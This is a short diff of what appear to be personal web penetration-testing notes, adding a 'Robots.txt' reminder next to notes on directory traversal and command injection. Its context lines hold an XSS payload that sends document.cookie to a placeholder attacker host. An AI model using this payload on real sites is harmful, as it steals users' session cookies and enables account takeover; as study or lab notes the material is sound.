@@ -73,6 +73,7 @@ Steps to make http server:
 	(2) <script>document.location="http://IPofLinOPStation:Port that it was created on"+document.cookie;</script>
 
 you can traverse the web server using ../../../../ etc...
+Robots.txt
 
 ; command is used to test for command injection
 ----------------------------------------------------------------------------
